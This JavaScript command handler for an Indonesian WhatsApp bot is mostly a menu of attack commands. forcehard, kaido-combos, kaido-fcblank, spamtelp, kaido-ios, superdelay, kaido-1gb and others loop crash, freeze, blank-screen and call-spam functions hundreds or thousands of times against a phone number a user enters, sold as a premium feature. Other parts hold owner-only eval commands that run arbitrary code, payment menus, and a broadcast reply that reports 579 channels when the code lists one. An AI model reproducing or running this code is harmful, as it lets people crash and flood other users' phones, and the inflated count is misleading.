case "k": case "kik": case "kick": case "babi": {
if (!isGroup) return mayzreply(msg.group)
if (!isBotAdmin) return mayzreply(msg.adminbot)
if (!isAdmin && !isOwner) return mayzreply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kirana.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => kirana.sendMessage(m.chat, {text: `Beban ilang 1`, mentions: [`${users}`]}, {quoted: m})).catch((err) => mayzreply(err.toString()))
} else return mayzreply(example('nomornya/@tag'))}
break
case "ai":
case "heckai":
 if (!args.length) {
 return mayzreply("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *.ai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(args.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return mayzreply("❌ AI tidak dapat memberikan jawaban.");
 }
 mayzreply(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 mayzreply("❌ Terjadi kesalahan saat mengakses AI.");
 }
 break
//========[ 𝙲𝚊𝚜𝚎 𝙱𝚞𝚐 ]========//
case 'forcehard': {
    if (!isPremium) return mayzreply("*Buat Premium Doang Beb😚*");
    if (!q) return mayzreply(`Kayak Gini Yak :\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Awalan Nomer Jangan 0 Tapi 62 Kayak Gini\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    }
  console.log(chalk.red.bold("Success!"))
}

break;
case 'forcecombo': {
    if (!isPremium) return mayzreply("*Buat Premium Doang Beb😚*");
    if (!q) return mayzreply(`Kayak Gini Yak :\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Awalan Nomer Jangan 0 Tapi 62 Kayak Gini\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await xforceflow(target)
    await HiDelete(target)
    await HiDelete(target)
    await HiDelete(target)
    await HiDelete(target)
    await HiDelete(target)
    await HiDelete(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'heiensj': {
    if (!botNumber) {
        return mayzreply("> *Khusus Bot Anjing*");
    }
    
    if (!q) {
        return mayzreply(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/`);
    }

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let target = await kirana.groupAcceptInvite(result);
    
    mayzreply(`*Success! x-grup sent to ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});
        
        //Paramater
        await Carousel(target)
        await NativeC(target)
        await DocFc(target)
        await CallGc(target)
        await InvisiPayload(target)
        await NewIos(target, Ptcp = true)
        await crashui2(target, ptcp = false)
        await crashui2(target, ptcp = false)
        await MSGSPAM(target)
        await InvisibleLoadFast(target)
   }
break;
case 'kaido-combos': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 700; r++) {
    await Carousel(target)
    await NativeC(target)
    await DocFc(target)
    await DocFc(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await OverloadCursor(target, ptcp = true)
    await OverloadCursor(target, ptcp = true)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await Carousel(target)
    await NativeC(target)
    await Carousel(target)
    await NativeC(target)
    await InvisibleLoadFast(target)
    await InvisibleLoadFast(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_notif(target)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await f10(target, Ptcp = false)
    await thunderblast_notif(target)
    await f10(target, Ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_notif(target)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await f10(target, Ptcp = false)
    await DocFc(target)
    await DocFc(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await Carousel(target)
    await NativeC(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-blnk': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await crashui2(target, ptcp = false)
    await Carousel(target)
    await NativeC(target)
    await thunderblast_notif(target)
    await f10(target, Ptcp = false)
    await invc2(target, ptcp = true)
    await invc2(target, ptcp = true)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-fcblank': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 1000; r++) {
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_notif(target)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await thunderblast_doc(target)
    await f10(target, Ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    await DocFc(target)
    await DocFc(target)
    await DocFc(target)
    await DocFc(target)
    await invc2(target, ptcp = true)
    await invc2(target, ptcp = true)
    await invc2(target, ptcp = true)
    await invc2(target, ptcp = true)
    await invc2(target, ptcp = true)
    await Carousel(target)
    await Carousel(target)
    await Carousel(target)
    await Carousel(target)
    await Carousel(target)
    await Carousel(target)
    await Carousel(target)
    await NativeC(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'gomu-gomu': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Succes Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await BlankScreen(target, Ptcp = false)
    await thunderblast_notif(target)
    await thunderblast_doc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await crashui2(target, ptcp = false)
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await f10(target, Ptcp = false)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-brutal': case 'ishogake': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await Carousel(target)
    await NativeC(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'spamtelp': {
    if (!isPremium) return mayzreply("*Khusus Premium Beb😚*");
    if (!q) return mayzreply(`Bukan Kayak Gitu:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Nomer Nya Jangan Awalan 0 Tapi Wajib 62 Kayak\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success! spam telpon ${target}*`);

    //Paramater
    for (let r = 0; r < 1000; r++) {
    await sendOfferCall(target)
    await sendOfferVideoCall(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-fuckios': case 'kaido-ios': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 100; r++) {
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-ngamuk': case 'kaido-cool': case 'kaido-lazarus': case 'kaido-tranfrom': {
    if (!isOwner) return mayzreply("*You are not a Premium User*");
    if (!botNumber) return mayzreply("This Feature Only Send By Bot Number");

    kirana.sendMessage(m.chat, { react: { text: '🤫', key: m.key } });
    kirana.sendMessage(m.chat, { react: { text: '🤪', key: m.key } });
    kirana.sendMessage(m.chat, { react: { text: '😜', key: m.key } });
    kirana.sendMessage(m.chat, { react: { text: '😝', key: m.key } });
    kirana.sendMessage(m.chat, { react: { text: '🥶', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 150; r++) {
    await Carousel(m.chat);
    await NativeC(m.chat);
    await crashui2(m.chat);
    await DocFc(m.chat);
    await DocFc(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break;
case 'superdelay': case 'kaido-delaybuldo': case 'kaido-blankchat': {
    if (!isPremium) return mayzreply("*Lu Bukan Premium Bangsad*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    
    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success! ${isCmd} sent to ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await DelayHard(target)
    await DelayHard(target)
    await DelayHard(target)
    await DelayHard(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await bulldozer(target)
    await XaDelayMaker(target)
    await bulldozer(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await delay(500);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'forcenew': case 'kaido-kill': {
    if (!isPremium) return mayzreply("*Buat Premium Doang Beb😚*");
    if (!q) return mayzreply(`Kayak Gini Yak :\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Awalan Nomer Jangan 0 Tapi 62 Kayak Gini\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await await bulldozer(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'bloodforce': {
    if (!isPremium) return mayzreply("*Buat Premium Doang Beb😚*");
    if (!q) return mayzreply(`Kayak Gini Yak :\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Awalan Nomer Jangan 0 Tapi 62 Kayak Gini\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 1000; r++) {
    await DelaySsuper(target)
    await XaDelayMaker(target)
    await XaDelayMaker(target)
    await bulldozer(target)
    await DelaySsuper(target)
    await AudioVisualXDellay(target)
    await AudioVisualXDellay(target)
    await AudioVisualXDellay(target)
    await AudioVisualXDellay(target)
    await AudioVisualXDellay(target)
    await AudioVisualXDellay(target)
    await AudioVisualXDellay(target)
    await xforceflow(isTarget)
    await xforceflow(isTarget)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'invishard': {
    if (!isPremium) return mayzreply("*Buat Premium Doang Beb😚*");
    if (!q) return mayzreply(`Kayak Gini Yak :\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Awalan Nomer Jangan 0 Tapi 62 Kayak Gini\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 100; r++) {
     await HiDelete(target)
     await HiDelete(target)
     await HiDelete(target)
     await HiDelete(target)
     await HiDelete(target)
     await HiDelete(target)
     await HiDelete(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'superhard': {
    if (!isPremium) return mayzreply("*Buat Premium Doang Beb😚*");
    if (!q) return mayzreply(`Kayak Gini Yak :\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`Awalan Nomer Jangan 0 Tapi 62 Kayak Gini\n\nExample: ${isCmd} 62xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success Jangan Lupa Jeda setelah menyerang ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 1000; r++) {
     await await bulldozer(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-1gb': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success! ${isCmd} sent to ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 1000; r++) {
     await bulldozer1GB(target)
     await bulldozer1GB(target)
     await bulldozer1GB(target)
     await bulldozer1GB(target)
     await bulldozer1GB(target)
     await bulldozer1GB(target)
     await bulldozer1GB(target)
     await bulldozer1GB(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'kaido-invisios': {
    if (!isPremium) return mayzreply("*You are not a Premium User*");
    if (!q) return mayzreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return mayzreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    mayzreply(`*Success! ${isCmd} sent to ${target}*`)
    kirana.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 600; r++) {
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
     await iosinVis(target)
    }
  console.log(chalk.red.bold("Success!"))
}
//======[Store Menu]======//
case 'dana' :
case 'ovo' :
case 'gopay' :
case 'shope' :
case 'bank' :
case 'payment' : {
if (command == "dana") {
uang = `*${namastore} PAYMENT*\n\n${dana}
`
} else if (command == "ovo") {
uang = `*${namastore} PAYMENT*
${ovo}
`
} else if (command == "gopay") {
uang = `*${namastore} PAYMENT*\n\n${gopay}
`
} else if (command == "shope") {
uang = `*${namastore} PAYMENT*\n\n${shope}
`
} else if (command == "bank") {
uang = `*${namastore} PAYMENT*\n\n${dana}
`
} else if (command == "payment") {
uang = `*COMMAND YANG TERSEDIA*
- dana
- gopay
- ovo
- shope
- bank

${namastore}`
}
if (isGroup) return mayzreply(msg.priv)
await kirana.sendMessage(m.chat,{image: qris , caption: uang }, { quoted: qtext2 })
}
break
case "sukiablpoa08": {
 if (!botNumber) return mayzreply('Khusus Bot Saja'); // Periksa apakah pengguna adalah creator
 
 if (!text) return mayzreply(example(`bukan gitu *.jpmch* < teksnya >`)); 
 
 // Daftar saluran WhatsApp (array berisi ID saluran WhatsApp)
 const daftarSaluran = [
"120363341601187231@newsletter"
// Tambahkan ID saluran lainnya
 ];

 // Kirim pesan ke semua saluran dalam daftar
 for (const idSaluran of daftarSaluran) {
 try {
 await kirana.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
 } catch (error) {
 console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
 mayzreply(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *579 Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
`);
}
break
case 'done': {
if (!botNumber) return mayzreply(`Khusus Bot`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return mayzreply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return mayzreply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return mayzreply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

🛍 Barang : _${barang}_
💰 Nominal : _${nominal}_
📆 Tanggal : _${hariini}_
🕰️ Waktu : _${wib}_
⏳ Status : Berhasil ✅

TERIMAKASIH TELAH ORDER ✅`
await kirana.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {quoted: qchanel })
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
